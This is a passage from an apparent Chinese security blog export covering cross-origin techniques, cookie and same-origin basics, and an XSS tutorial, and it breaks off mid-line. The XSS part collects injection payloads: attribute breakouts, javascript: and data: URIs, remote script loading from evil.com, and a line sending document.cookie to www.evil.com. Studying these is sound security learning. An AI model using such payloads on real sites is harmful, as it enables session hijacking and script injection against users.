class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">&gt; <span class="built_in">console</span>.log(<span class="string">"bank "</span>+<span class="built_in">window</span>.name);</span></span><br><span class="line"><span class="javascript">&gt; <span class="built_in">window</span>.name = <span class="string">"world"</span>;</span></span><br><span class="line"><span class="javascript">&gt; <span class="built_in">window</span>.location = <span class="string">"http://evil.com/404.html"</span>;</span></span><br><span class="line"><span class="undefined">&gt; </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><h4 id="4-Cross-Origin-Resource-Sharing"><a href="#4-Cross-Origin-Resource-Sharing" class="headerlink" title="4. Cross-Origin Resource Sharing"></a>4. Cross-Origin Resource Sharing</h4><blockquote><p>CORS（跨越资源共享）</p><p>CORS定义了一种浏览器和服务器协商确定是否可以进行跨域请求的方法。</p><p>浏览器将CORS请求分两类：简单请求和非简单请求</p><p><img src="/img/front/1537629814411.png" alt="来自维基百科"></p><p>简单请求需要满足以下条件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt; 1. 请求方法为HEAD或GET或POST</span><br><span class="line">&gt; 2. HTTP头信息只能是下面几种</span><br><span class="line">&gt; - Accept</span><br><span class="line">&gt; - Accept-Language</span><br><span class="line">&gt; - Content-Language</span><br><span class="line">&gt; - Last-Event-ID</span><br><span class="line">&gt; - Content-Type: （application/x-www-form-urlencoded、multipart/form-data、text/plain）</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure><p>不满足简单请求的就是非简单请求。<br>简单请求流程：<br>浏览器发现是这次跨域AJAX请求是简单请求，会在头信息中添加<code>Origin</code>头，表明请求来自哪个源。服务器检查<code>Origin</code>头，确定是否允许该请求，如果允许，则返回中带有<code>Access-Control-Allow-Origin</code>头，如果不允许，则可以不添加<code>Access-Control-Allow-Origin</code>头，此时浏览器会抛出错误。<br>非简单请求流程：<br>浏览器发现是这次跨域AJAX请求是非简单请求，则会先发送一个<code>OPTIONS</code>请求。如果服务器允许跨源请求，则返回<code>Access-Control-Allow-Origin</code>。</p></blockquote><h4 id="5-Cross-document-messaging-window-postMessage"><a href="#5-Cross-document-messaging-window-postMessage" class="headerlink" title="5. Cross-document messaging(window.postMessage)"></a>5. Cross-document messaging(window.postMessage)</h4><blockquote><p>HTML5 引进的全新API(window.postMessage)，允许跨窗口通信，无论是否同源，可以安全地实现跨域通信。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt; otherWindow.postMessage(message, targetOrigin, [transfer]);</span><br><span class="line">&gt; otherWindow:其他窗口的一个引用，比如iframe的contentWindow属性、执行window.open返回的窗口对象、或者是命名过或数值索引的window.frames</span><br><span class="line">&gt; message:将要发送到其他 window的数据。它将会被结构化克隆算法序列化</span><br><span class="line">&gt; targetOrigin:通过窗口的origin属性来指定哪些窗口能接收到消息事件，其值可以是字符串"*"（表示无限制）或者一个URI。在发送消息的时候，如果目标窗口的协议、主机地址或端口这三者的任意一项不匹配targetOrigin提供的值，那么消息就不会被发送；只有三者完全匹配，消息才会被发送。</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure><p>同时，可以通过监听<code>message</code>事件来获取消息。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt; window.addEventListener("message", receiveMessage, false);</span><br><span class="line">&gt; 这个事件包含几个属性</span><br><span class="line">&gt; event.data:传递过来的对象</span><br><span class="line">&gt; event.origin:调用postMessage时的消息发送方窗口的origin</span><br><span class="line">&gt; event.source:发送消息的窗口对象的引用，可以用它来回复消息</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure><p>例子：</p><p><a href="http://evil.com/index.php" target="_blank" rel="noopener">http://evil.com/index.php</a></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;<span class="name">title</span>&gt;</span>evil<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">&gt; <span class="function"><span class="keyword">function</span> <span class="title">receiveMessage</span>(<span class="params">event</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">&gt; <span class="keyword">if</span>(event.origin !== <span class="string">"http://bank.com"</span>)</span></span><br><span class="line"><span class="javascript">&gt; <span class="keyword">return</span>;</span></span><br><span class="line"><span class="javascript">&gt; <span class="built_in">console</span>.log(<span class="string">"evil window "</span> + event.data);</span></span><br><span class="line"><span class="undefined">&gt; &#125;</span></span><br><span class="line"><span class="javascript">&gt; <span class="built_in">window</span>.addEventListener(<span class="string">"message"</span>, receiveMessage, <span class="literal">false</span>);</span></span><br><span class="line"><span class="javascript">&gt; <span class="keyword">var</span> iframe = <span class="built_in">document</span>.createElement(<span class="string">'iframe'</span>);</span></span><br><span class="line"><span class="javascript">&gt; iframe.style.display = <span class="string">'none'</span>;</span></span><br><span class="line"><span class="javascript">&gt; iframe.src = <span class="string">"http://bank.com/index.php"</span>;</span></span><br><span class="line"><span class="javascript">&gt; <span class="built_in">document</span>.body.appendChild(iframe);</span></span><br><span class="line"><span class="javascript">&gt; iframe.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;iframe.contentWindow.postMessage(<span class="string">"hello world"</span>, <span class="string">"*"</span>);&#125;;</span></span><br><span class="line"><span class="undefined">&gt; </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure><p><a href="http://bank.com/index.php" target="_blank" rel="noopener">http://bank.com/index.php</a></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">&gt; <span class="function"><span class="keyword">function</span> <span class="title">receiveMessage</span>(<span class="params">event</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">&gt; <span class="built_in">console</span>.log(<span class="string">"bank window "</span> + event.data);</span></span><br><span class="line"><span class="javascript">&gt; <span class="keyword">if</span>(event.origin !== <span class="string">"http://evil.com"</span> )</span></span><br><span class="line"><span class="javascript">&gt; <span class="keyword">return</span>;</span></span><br><span class="line"><span class="javascript">&gt; <span class="built_in">console</span>.log(<span class="string">"bank window "</span> + event.data);</span></span><br><span class="line"><span class="javascript">&gt; event.source.postMessage(<span class="string">"good job!"</span>, <span class="string">"*"</span>);</span></span><br><span class="line"><span class="undefined">&gt; &#125;</span></span><br><span class="line"><span class="javascript">&gt; <span class="built_in">window</span>.addEventListener(<span class="string">"message"</span>, receiveMessage, <span class="literal">false</span>);</span></span><br><span class="line"><span class="undefined">&gt; </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><h4 id="6-JSONP"><a href="#6-JSONP" class="headerlink" title="6. JSONP"></a>6. JSONP</h4><blockquote><p>JSON with Padding<br>通过<code>&lt;script&gt;</code>来向服务器请求JSON数据，<code>&lt;script&gt;</code>标签不受同源策略的限制。<br>一般来说，请求会带上<code>callback</code>参数，指定返回的函数名，服务器会把数据放到指定的回调函数里传回来。<br><a href="http://bank.com" target="_blank" rel="noopener">http://bank.com</a><br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">&gt; <span class="function"><span class="keyword">function</span> <span class="title">showData</span>(<span class="params">data</span>) </span>&#123;</span></span><br><span class="line"><span class="undefined">&gt; alert(data.message);</span></span><br><span class="line"><span class="undefined">&gt; &#125;</span></span><br><span class="line"><span class="undefined">&gt; </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"http://evil.com/jsonp.php?callback=showData"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></p><p><a href="http://evil.com/jsonp.php" target="_blank" rel="noopener">http://evil.com/jsonp.php</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="meta">&lt;?php</span> <span class="keyword">echo</span> $_GET[<span class="string">'callback'</span>];<span class="meta">?&gt;</span>(&#123;message:<span class="string">"hello gaia!!!"</span>&#125;);</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><h4 id="7-WebSockets"><a href="#7-WebSockets" class="headerlink" title="7. WebSockets"></a>7. WebSockets</h4><blockquote><p><code>ws://</code>和<code>wss://</code>协议不受同源策略影响。</p></blockquote><h3 id="资源"><a href="#资源" class="headerlink" title="资源"></a>资源</h3><blockquote><p>HTTP消息头</p><p>DOM树</p><p>浏览器存储(Cookies、Flash Cookies、localStorage等)</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web前端 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Web前端基础知识</title>
      <link href="//blog/2018/Web%E5%89%8D%E7%AB%AF%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86.html"/>
      <url>//blog/2018/Web%E5%89%8D%E7%AB%AF%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86.html</url>
      
        <content type="html"><![CDATA[<hr><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote><p>本文主要介绍学习web前端安全前的基础知识。</p></blockquote><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><h3 id="HTML-CSS-JavaScript"><a href="#HTML-CSS-JavaScript" class="headerlink" title="HTML+CSS+JavaScript"></a>HTML+CSS+JavaScript</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">HTML（超文本标记语言），用于定义网页结构。</span><br><span class="line"></span><br><span class="line">CSS（层叠样式表），用于描述网页样式。</span><br><span class="line"></span><br><span class="line">JavaScript（一种脚本语言），用于进行各种动态操作。</span><br></pre></td></tr></table></figure><h3 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h3><blockquote><p><strong>格式</strong>：<br><code>Set-Cookie: &lt;name&gt;=&lt;value&gt;[; &lt;Max-Age&gt;=&lt;age&gt;] [; expires=&lt;date&gt;][; domain=&lt;domain_name&gt;] [; path=&lt;some_path&gt;][; secure][; HttpOnly]</code><br>也可以看一下PHP的setcookie函数<br><code>bool setcookie ( string $name [, string $value = &quot;&quot; [, int $expires = 0 [, string $path = &quot;&quot; [, string $domain = &quot;&quot; [, bool $secure = FALSE [, bool $httponly = FALSE &gt; ]]]]]] )</code></p><p>name：名字<br>value：值<br>expires：过期时间。没有设置过期时间时，该cookie仅限于当前会话，关闭浏览器就会删除；设置了过期时间，则会在过期后被删除。<br>(注：expires是http/1.0的选项，在http/1.1中由max-age取代，取值分为：负数、0、正数。负数则有效期为当前会话，0则删除cookie，正数则创建时间+max-age秒后过期。)<br>path：路径，该路径及其子路径下可以访问。<br>domain：域名，假设设置为<code>gaia.com</code>，则<code>gaia.com</code>和<code>*.gaia.com</code>可以访问。<br>secure：默认无，当有设置时，该cookie仅在HTTPS或者其他安全协议情况下传输<br>httponly：默认无，当有设置时，客户端不允许javascript访问cookie</p><p><strong>cookie排序问题</strong>：<br>越详细的cookie，在发送时越靠前。<br>domain-&gt;path-&gt;secure<br>即，先通过domain详细程度排序，然后通过path详细程度排序，最后通过secure排序</p><p><strong>cookie修改/删除</strong></p><p>name/domain/path</p><p>这三者相同，修改则改值，覆盖则设置过期时间为过去的时间点。</p></blockquote><h3 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a>同源策略</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">不同域的客户端脚本在没明确授权的情况下，不能读写对方的资源。</span><br></pre></td></tr></table></figure><ul><li><p>同域和不同域</p><blockquote><p>同域：同协议、同域名、同端口</p><p>URI scheme、 hostname、 port </p></blockquote></li><li><p>跨域方法</p><ul><li>通过document.domain跨子域</li><li>通过location.hash跨域</li><li>通过window.name跨域</li><li>Cross-Origin Resource Sharing</li><li>Cross-document messaging(window.postMessage)</li><li>JSONP</li><li>WebSockets</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web前端 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>XSS漏洞</title>
      <link href="//blog/2018/XSS%E6%BC%8F%E6%B4%9E.html"/>
      <url>//blog/2018/XSS%E6%BC%8F%E6%B4%9E.html</url>
      
        <content type="html"><![CDATA[<hr><h3 id="XSS是什么"><a href="#XSS是什么" class="headerlink" title="XSS是什么"></a>XSS是什么</h3><p>XSS全称跨站脚本攻击，是一种在web程序中常见的漏洞。</p><h3 id="XSS产生原因"><a href="#XSS产生原因" class="headerlink" title="XSS产生原因"></a>XSS产生原因</h3><p>对用户的输入未进行有效的过滤、编码，输出到网页中，导致注入并执行JavaScript代码。</p><h3 id="XSS分类"><a href="#XSS分类" class="headerlink" title="XSS分类"></a>XSS分类</h3><ul><li>反射型</li></ul><p>直接输入参数，返回的页面中包含输入的参数。</p><ul><li>存储型</li></ul><p>用户输入进入到持久储存介质中，如文件、数据库，访问时从该介质中取数据输出到页面中。</p><ul><li>DOM型</li></ul><p>用户输入在前端的JavaScript处理DOM时达到了注入JavaScript代码的效果，导致恶意JavaScript代码执行。</p><h3 id="XSS防御方式"><a href="#XSS防御方式" class="headerlink" title="XSS防御方式"></a>XSS防御方式</h3><ul><li><p>后端对用户输入进行过滤和编码</p><ul><li>htmlspecialchars 函数</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&amp; (AND) =&gt; &amp;amp;</span><br><span class="line">&quot; (双引号) =&gt; &amp;quot; (当ENT_NOQUOTES没有设置的时候) </span><br><span class="line">&apos; (单引号) =&gt; &amp;#039; (当ENT_QUOTES设置) </span><br><span class="line">&lt; (小于号) =&gt; &amp;lt; </span><br><span class="line">&gt; (大于号) =&gt; &amp;gt;</span><br></pre></td></tr></table></figure><p>缺陷：</p><p>如果输出点在某些特别的位置，该防御无效，如</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">标签的属性中</span><br><span class="line">&lt;a href=&quot;$user_input&quot;&gt;</span><br><span class="line">&lt;div style=&quot;$user_input&quot;&gt;</span><br><span class="line">&lt;img src=&quot;$user_input&quot;&gt;</span><br><span class="line"></span><br><span class="line">script代码中</span><br><span class="line">&lt;script&gt;$user_input&lt;/script&gt;</span><br></pre></td></tr></table></figure><ul><li>黑名单过滤</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">常用的如</span><br><span class="line">script</span><br><span class="line">on\w+=</span><br><span class="line">iframe</span><br></pre></td></tr></table></figure><p>缺陷：</p><p>限制太多则对用户不友好，而且黑名单限制往往可被绕过。</p></li><li><p>内容安全策略CSP(Content Security Policy)</p><ul><li><p>CSP是什么</p><p>内容安全策略以白名单的形式限制了加载和执行资源，配置良好的CSP可以防御很大一部分的XSS攻击。</p></li><li><p>CSP使用方法</p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> </span><br></pre></td></tr></table></figure></li></ul><ul><li>CSP绕过方法</li></ul><ul><li></li></ul><h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h3><h4 id="AJAX"><a href="#AJAX" class="headerlink" title="AJAX"></a>AJAX</h4><p>Asynchronous JavaScript And XML</p><p>可用于局部更新网页</p><h4 id="DOM"><a href="#DOM" class="headerlink" title="DOM"></a>DOM</h4><p>Document Object Model</p><p>将HTML/XML抽象成树形结构，节点代表标签、标签属性、标签内容。</p><h3 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a>同源策略</h3><blockquote><p><em>不同域</em>的客户端脚本在没有明确<em>授权</em>的情况下，不能<em>读写</em>对方的<em>资源</em>。</p></blockquote><h4 id="不同域"><a href="#不同域" class="headerlink" title="不同域"></a>不同域</h4><p>同协议、同域名、同端口</p><h4 id="授权"><a href="#授权" class="headerlink" title="授权"></a>授权</h4><p>默认是不允许跨域访问，除了目标站点返回的HTTP响应头中含有：</p><blockquote><p>Access-Control-Allow-Origin: <a href="http://www.evil.com" target="_blank" rel="noopener">http://www.evil.com</a></p></blockquote><p>此时，www.evil.com站点上的脚本才有权通过AJAX对目标站点进行读写操作。</p><h4 id="CORS机制（跨域资源共享）"><a href="#CORS机制（跨域资源共享）" class="headerlink" title="CORS机制（跨域资源共享）"></a>CORS机制（跨域资源共享）</h4><h3 id="XSS的位置"><a href="#XSS的位置" class="headerlink" title="XSS的位置"></a>XSS的位置</h3><h4 id="HTML标签之间"><a href="#HTML标签之间" class="headerlink" title="HTML标签之间"></a>HTML标签之间</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">以下标签需闭合如：</span><br><span class="line">&lt;title&gt;&lt;/title&gt;</span><br><span class="line">&lt;textarea&gt;&lt;/textarea&gt;</span><br><span class="line">&lt;xmp&gt;&lt;/xmp&gt;</span><br><span class="line">&lt;iframe&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;noscript&gt;&lt;/noscript&gt;</span><br><span class="line">&lt;noframes&gt;&lt;/noframes&gt;</span><br><span class="line">&lt;plaintext&gt;&lt;/plaintext&gt;</span><br><span class="line"></span><br><span class="line">可构造如：</span><br><span class="line">&lt;/title&gt;&lt;script&gt;alert(1)&lt;/script&gt;</span><br><span class="line">注：&lt;script&gt;和&lt;style&gt;标签不能嵌套</span><br></pre></td></tr></table></figure><h4 id="HTML标签之内"><a href="#HTML标签之内" class="headerlink" title="HTML标签之内"></a>HTML标签之内</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">如：</span><br><span class="line">&lt;input type=&quot;text&quot; value=&quot;xxxx&quot; /&gt;</span><br><span class="line">可构造成</span><br><span class="line">&lt;input type=&quot;text&quot; value=&quot;xxxx&quot; onmouseover=&quot;javascript:alert(1)&quot; x=&quot; &quot; /&gt;</span><br><span class="line">或</span><br><span class="line">&lt;input type=&quot;text&quot; value=&quot;xxxx&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&quot; /&gt;</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">如：</span><br><span class="line">&lt;input type=<span class="string">"hidden"</span> value=<span class="string">"xxx"</span> /&gt;</span><br><span class="line">与</span><br><span class="line">&lt;input value=<span class="string">"xxx"</span> type=<span class="string">"hidden"</span> /&gt;</span><br><span class="line">其中，前者若闭合属性，由于hidden属性导致触发不了xss，只能考虑闭合标签</span><br><span class="line">而，后者可以构造成</span><br><span class="line">&lt;input value=<span class="string">"xxx"</span> onmouseover=<span class="string">"javascript:alert(1)"</span> type=<span class="string">"text"</span>  type=<span class="string">"hidden"</span>/&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">如在src/href/action等属性内</span><br><span class="line">&lt;a = href=&quot;xxx&quot;&gt;click me&lt;/a&gt;</span><br><span class="line">可构造</span><br><span class="line">&lt;a = href=&quot;javascript:alert(1)&quot;&gt;click me&lt;/a&gt;  //所有浏览器</span><br><span class="line">&lt;a = href=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg== &quot;&gt;click me&lt;/a&gt;  //IE不支持</span><br><span class="line">当存在后缀限制时</span><br><span class="line">如</span><br><span class="line">&lt;a = href=&quot;xxxhtml&quot;&gt;click me&lt;/a&gt;</span><br><span class="line">可构造</span><br><span class="line">&lt;a = href=&quot;javascript:alert(1);html&quot;&gt;click me&lt;/a&gt;</span><br><span class="line">&lt;a = href=&quot;javascript:alert(1)// html&quot;&gt;click me&lt;/a&gt; </span><br><span class="line">&lt;a = href=&quot;javascript:alert(1) - html&quot;&gt;click me&lt;/a&gt; // 算术符号</span><br><span class="line">&lt;a href=&quot;data:text/html,&lt;img src=# onerror=alert(1) &gt;&quot;&gt;测试&lt;/a&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">如在on*事件内，</span><br><span class="line">&lt;a href=# onclick=&quot;xxx&quot;&gt;click me&lt;/a&gt;</span><br><span class="line">可构造</span><br><span class="line">&lt;a href=# onclick=&quot;alert(1)&quot;&gt;click me&lt;/a&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">如在style属性内，</span><br><span class="line">&lt;a href=# style=&quot;xxxx&quot;&gt;click me&lt;/a&gt;</span><br><span class="line">仅IE</span><br><span class="line">&lt;a href=# style=&quot;width:1;xss:expression(if(!window.x)&#123;alert(1);windo.x=1;)&quot;&gt;click me&lt;/a&gt;</span><br></pre></td></tr></table></figure><h4 id="成为JavaScript代码的值"><a href="#成为JavaScript代码的值" class="headerlink" title="成为JavaScript代码的值"></a>成为JavaScript代码的值</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;a=&quot;xxx&quot;;&lt;/script&gt;</span><br></pre></td></tr></table></figure><h4 id="成为CSS值"><a href="#成为CSS值" class="headerlink" title="成为CSS值"></a>成为CSS值</h4><p>跟style中差不多</p><h3 id="特殊"><a href="#特殊" class="headerlink" title="特殊"></a>特殊</h3><h5 id="link标签"><a href="#link标签" class="headerlink" title="link标签"></a>link标签</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">仅chrome可用</span><br><span class="line">&lt;link ref=import href=//xxx.me&gt;</span><br><span class="line">xxx.me服务器上php源代码</span><br><span class="line">&lt;?php </span><br><span class="line">header(&apos;Access-Control-Allow-Origin: *&apos;);</span><br><span class="line">?&gt;        </span><br><span class="line">&lt;script&gt; </span><br><span class="line">alert(1)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3 id="常用xss语句收集"><a href="#常用xss语句收集" class="headerlink" title="常用xss语句收集"></a>常用xss语句收集</h3><h4 id="短语句"><a href="#短语句" class="headerlink" title="短语句"></a>短语句</h4><p>使用了jquery的情况下</p><blockquote><p>eval($.get(‘//xxxx.com’))</p><p>$.getScript(‘//xxx.com’) </p></blockquote><h4 id="获取数据常用"><a href="#获取数据常用" class="headerlink" title="获取数据常用"></a>获取数据常用</h4><p><strong>调用外部js</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=<span class="string">"http://evil.com/xss.js"</span>&gt;</span><br></pre></td></tr></table></figure><p><strong>发送cookie</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="built_in">document</span>.location=<span class="string">'http://www.evil.com/cookie.asp?cookie='</span>+<span class="built_in">document</span>.cookie</span><br><span class="line">&lt;<span 